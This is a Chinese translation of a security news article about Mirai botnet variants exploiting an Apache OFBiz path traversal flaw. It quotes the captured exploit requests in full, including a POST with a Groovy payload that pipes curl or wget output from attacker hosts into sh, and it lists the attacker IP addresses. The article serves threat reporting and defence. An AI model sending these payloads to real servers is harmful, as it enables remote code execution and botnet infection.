---
title: Mirai 僵尸网络利用 OFBiz 服务器中存在的路径遍历漏洞进行传播
url: https://www.anquanke.com/post/id/298770
source: 安全客-有思想的安全新媒体
date: 2024-08-06
fetch_date: 2025-10-06T18:02:32.343315
---

# Mirai 僵尸网络利用 OFBiz 服务器中存在的路径遍历漏洞进行传播

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Mirai 僵尸网络利用 OFBiz 服务器中存在的路径遍历漏洞进行传播

阅读量**61199**

发布时间 : 2024-08-05 14:48:20

**x**

##### 译文声明

本文是翻译文章，文章原作者 The Hacker News，文章来源：The Hacker News

原文地址：<https://thehackernews.com/2024/08/mirai-botnet-targeting-ofbiz-servers.html>

译文仅供参考，具体内容表达以及含义原文为准。

企业资源规划 （ERP） 软件是许多支持人力资源、会计、运输和制造的企业的核心。这些系统可能会变得非常复杂且难以维护。它们通常是高度定制的，这可能会使修补变得困难。但是，关键漏洞会不断影响这些系统，并使关键业务数据面临风险。

SANS Internet Storm Center 发布了一份报告，展示了开源 ERP 框架 OFBiz 目前如何成为 Mirai 僵尸网络新品种的目标。

作为其广泛的项目组合的一部分，Apache基金会支持OFBiz，这是一个基于Java的框架，用于创建ERP（企业资源规划）应用程序。OFBiz 似乎远不如商业替代品普遍。然而，与任何其他ERP系统一样，组织依赖它来存储敏感的业务数据，而这些ERP系统的安全性至关重要。

今年 5 月，OFBiz 发布了一个关键安全更新。此更新修复了一个目录遍历漏洞，该漏洞可能导致远程命令执行。18.12.13 之前的 OFBiz 版本受到影响。几周后，有关该漏洞的详细信息被公开。

目录遍历或路径遍历漏洞可用于绕过访问控制规则。例如，如果用户可以访问“/public”目录，但不能访问“/admin”目录，则攻击者可能会使用类似“/public/../admin“来欺骗访问控制逻辑。最近，CISA 和 FBI 发布了一个警报，作为“安全设计”计划的一部分，重点关注目录遍历。CISA 指出，他们目前正在跟踪 55 个目录遍历漏洞，作为“已知利用漏洞”（KEV） 目录的一部分。

对于 OFBiz，插入分号可以很容易地触发目录遍历。攻击者只需找到一个他们可以访问的 URL，并附加一个分号，后跟一个受限制的 URL。我们目前看到的漏洞利用 URL 是：

```
/webtools/control/forgotPassword;/ProgramExport
```

由于用户必须能够在不先登录的情况下重置密码，因此“forgotPassword”不需要任何身份验证。另一方面，“ProgramExport”应该是访问控制的，除非用户登录，否则无法访问。“ProgramExport”特别危险，因为它允许任意代码执行。OFBiz 中的错误逻辑停止评估分号处的 URL。这允许任何用户在不登录的情况下访问 URL 的第二部分“/ProgramExport”。

攻击者必须使用 POST 请求来利用此漏洞，但不一定需要请求正文。相反，URL 参数可以正常工作。

SANS Internet Storm Center 使用广泛的蜜罐网络来检测利用各种 Web 应用程序漏洞的尝试。“首次发现”报告中总结了重要的新漏洞利用尝试。本周末，这些传感器检测到利用 CVE-2024-32213（上述 OFBiz 目录遍历漏洞）的尝试显着增加，该漏洞立即被“First Seen”报告发现。

![]()

漏洞利用尝试源自两个不同的 IP 地址，这些 IP 地址也与利用物联网设备的各种尝试相关联，通常与当前种类的“Mirai”僵尸网络相关联。

歹徒使用了两种类型的漏洞利用。第一个使用 URL 来包含漏洞利用打算执行的命令：

```
POST /webtools/control/forgotPassword;/ProgramExport?groovyProgram=groovyProgram=throw+new+Exception('curl https://95.214.27.196/where/bin.sh
```

第二个使用了命令请求的正文，这在“POST”请求中更为常见：

```
POST /webtools/control/forgotPassword;/ProgramExport HTTP/1.1
User-Agent: Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0
Host: [victim IP address]
Accept: */*
Upgrade-Insecure-Requests: 1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
groovyProgram=throw+new+Exception('curl https://185.196.10.231/sh | sh -s ofbiz || wget -O- https://185.196.10.231/sh | sh -s ofbiz'.execute().text);
```

可悲的是，“bin.sh”和“sh”脚本都没有恢复。7 月 29 日，使用用户代理“KrebsOnSecurity”对 IP 地址进行了扫描，这是对信息安全博主 Brian Krebs 的提示。然而，扫描的URL大多是寄生的，寻找先前攻击留下的现有Web Shell。该 IP 地址还用于分发名为“botx.arm”的文件。此文件名通常与 Mirai 变体相关联。

随着 5 月份的漏洞公告，我们一直在等待一些扫描以利用 OFBiz 漏洞。剥削是微不足道的，虽然脆弱和暴露的人口很少，但这在过去并没有阻止攻击者。但他们现在至少在试验，并可能将漏洞添加到像Mirai变体这样的机器人中。

仅涉及几个 IP：

* 95.214.27.196：将漏洞作为 URL 参数发送并托管恶意软件。
* 83.222.191.62：将漏洞作为请求正文发送。托管在 185.196.10.231 上的恶意软件。7 月初，该 IP 扫描了 IoT 漏洞。
* 185.196.10.231：托管恶意软件

如果您觉得这篇文章很有趣，并想更深入地了解保护 Web 应用程序、API 和微服务的世界，您可以加入我的网络安全 2024（9 月 4 日至 9 日）课程 SEC522。在此处查看活动店内的所有内容。

**注意：***本文由 SANS 技术研究所研究院长 Johannes Ullrich 博士撰写和贡献。*

本文翻译自The Hacker News [原文链接](https://thehackernews.com/2024/08/mirai-botnet-targeting-ofbiz-servers.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/298770](/post/id/298770)

安全KER - 有思想的安全新媒体

本文转载自: [The Hacker News](https://thehackernews.com/2024/08/mirai-botnet-targeting-ofbiz-servers.html)

如若转载,请注明出处： <https://thehackernews.com/2024/08/mirai-botnet-targeting-ofbiz-servers.html>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)
* [安全热点](/tag/%E5%AE%89%E5%85%A8%E7%83%AD%E7%82%B9)

**+1**0赞

收藏

![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p4.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=170338)

[安全客](/member.html?memberId=170338)

这个人太懒了，签名都懒得写一个

* 文章
* **823**

* 粉丝
* **1**

### TA的文章

* ##### [严重的GiveWP漏洞（CVE-2024-8353）影响10万WordPress网站](/post/id/300547)

  2024-09-30 15:03:21
* ##### [Patchwork APT 的 Nexe 后门活动曝光](/post/id/300549)

  2024-09-30 15:03:07
* ##### [用户在一次复杂的钓鱼攻击中损失了价值3200万美元的spWETH](/post/id/300551)

  2024-09-30 15:02:50
* ##### [车牌信息成安全漏洞：起亚汽车远程控制风险揭示联网车辆网络安全问题](/post/id/300553)

  2024-09-30 15:02:09
* ##### [严重SQL注入漏洞影响TI WooCommerce Wishlist插件，超10万WordPress网站面临风险](/post/id/300556)

  2024-09-30 15:01:53

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)